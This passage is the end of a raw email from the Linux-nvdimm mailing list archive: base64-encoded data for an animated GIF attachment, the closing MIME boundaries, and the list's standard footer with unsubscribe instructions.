PDf0ctOBZ6o/E0+i+sMEL0W9hJswY4g4cRMNVNmhdfzkQ1+DHfZShqJBwdtSCDi03Zz2g+nT
L0mrThwEACH5BAUEAC8ALDAADwAvAC4AAAb/wIlwkqEYj8ikZMlsOp/PYTFJpaAGI6h2yxRO
q8bQgkvmEsHHSXmt/VYzDbbciaas2JqPZs5EA7YgDwgbBYWGGwkcIGxgd1AfCYaSk4Udi2RV
JFlOIJGUn5IRe1tUAZtNHKCqkgIfpEghDE8Kq7WGHFpJf04ftr4Frk9IEE8ehL+1Gx5PB0ey
TSDHyMmXTBXNKE8G078IThXXcU203L8KTeAqThrS5cmjEuAOTg/uyA/WFeJM7farG9ZKOBHh
D9myeCScRCj4C188Yk0QMPTlLd4ufhNtCVhS4eKSjL44DnBS68EDARM5epSwqsOSegxVklTl
MhXDjfHGRGyZsWIFc4hMOoBcFYHjBSfkhn7CFU8gNKWgRoE7tWQbVEkJ8ulkYvNqIaZcUHrF
SYag12BlJELNiscqSAHw1hgDqYyPBA9u/Rk4aFdD3nIG4vb1VE6UXSgixP5qdXiLBgWKVRkA
25iLBwUdEGje3EEB38qgQ4ueEwQAIfkEBQQALwAsMQAQACwAKwAABv/Al3BILL5CK4BxyWwy
KaSBc0pdkhjVbJWy0HqdISxVQv4ySSMmWQL6fEQP0UezNr8CaaNEo0hsmAIJImVaFEpFexF/
VQIKdFuHRBIii14CHxJTFBN6D3ZDEZlNJHodn0ShTCENiBynRRyiRV2Srq9Fg0UheUMglbdC
GyCziAbARgiyFbwvErbHsKIuiALQRgKiGLDWSyIvFZHNCdxGHRIViORGGxItRR/qRh4q2/FE
IvREnvZDD/n9/Pr9E7LPiYdfZvwVKahGwsFTCga+8NYklrNXH1i8m9Lh4SkQ6CQFfIENnCQE
Ac29QFHPHsVpRDQgtIatial4DI3IVLdBw5Q9Z9YoOpEwzloqKhqMHTMgC2nRVwl8epFw89PR
LxIUzKSyIdfHp1UiDAPG5kG1Jo2kcmPD4YHbtxxANG0SBAAh+QQFBAAvACwxABAALAArAAAG
/8CXcEgsvigUknHJbDaTi4ZzSi1SAoCqthrKbr/MJANMthJGTol6rS4PKSimGqToIBCGlwER
4YAkZUpGEhocAlQJH21aJGhFEiIbXwh/XFKPHWUbCoBOFGNFGnluLx2dSxQrgwikQw+nRQGO
QxKZrUMcsEIUXrQKt0WKRSFGH8BFGxpFcUQSrMdECKcVoLjQxUMlj6PXQwmdgkMg3UbjLw5F
v+REvxW9L87rRKYVj4fyQgYS9c34zfy0/NECKESXvH2PtNwrs28WPElTCHH7os9ds2dMcqkx
RkbauSIRppjyABHMAyHhhHBAVBKMByHaiGho2U1ApwqXCtpat7KJOUZyApQ1kRCSnDAnorqZ
qgKCJikDQqlIIAkM6heJrUwZpJK0zFI3Ejg4dbIh1y0JIB6MLSLggYatDMN2WDhEQAeNB9no
1RIEACH5BAUEAC8ALEQAKQAFAAYAAAYVQIlnUyhIhMQjMqIUFTpHZyHxEAQBACH5BAUEAC8A
LEQAKQAHAAcAAAYcQIlHUCgWJBKNwYhMgpacZhIq7RSjEqvRQCwEAQAh+QQFBAAvACxHACkA
BgAHAAAGGMDXy2AQDjWa4ksjkWg2wmbHSF1SCwVqEAAh+QQFBAAvACxKACgABAAEAAAGDkAD
yFDQSDQGibKzLAQBACH5BAUEAC8ALEoAJgAGAAYAAAYWwNdrkxAOPZLOUSLRbIRNg1EjNSKM
QQAh+QQFBAAvACxKACQABwAIAAAGHMCX8CUYCg0azhApkSiRr2YHGu0YJdYh1vjKCoMAIfkE
BQQALwAsTgAjAAUABAAABg/Al0HxEmoknKJkiVB2XkEAOw==

------=_NextPart_000_0012_7578D619.9C11242E--

--===============6641903299004231505==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
To unsubscribe send an email to linux-nvdimm-leave@lists.01.org

--===============6641903299004231505==--
